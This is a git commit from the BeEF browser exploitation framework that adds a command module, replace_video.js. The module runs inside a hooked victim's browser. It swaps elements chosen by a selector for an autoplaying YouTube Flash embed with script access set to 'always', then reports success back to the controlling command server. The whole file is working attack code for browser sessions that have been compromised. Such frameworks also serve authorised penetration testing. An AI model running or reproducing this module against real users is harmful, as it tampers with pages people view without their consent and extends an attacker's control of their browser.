6f431929bc68782f95a586e3efa198dbfd3a6c7f
yori.kvitchko <yori.kvitchko@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-01-05 03:42:53 +0000

    replace video module, initial commit
    git-svn-id: https://beef.googlecode.com/svn/trunk@670 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

---
+++ modules/commands/misc/replace_video/replace_video.js
@@ -0,0 +1,15 @@
+beef.execute(function() {
+	
+	$j('<%= @jquery_selector %>').each(
+		function ( intIndex ) {
+			
+			var width = $j(this).css('width');
+			var height = $j(this).css('height');
+			
+			$j(this).replaceWith('<embed src="http://www.youtube.com/v/<%= @youtube_id %>?fs=1&amp;hl=en_US&amp;autoplay=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="' + width + '" height="' + height + '">');
+			
+		}
+	)
+	
+	beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=Replace Video Succesfull");
+});
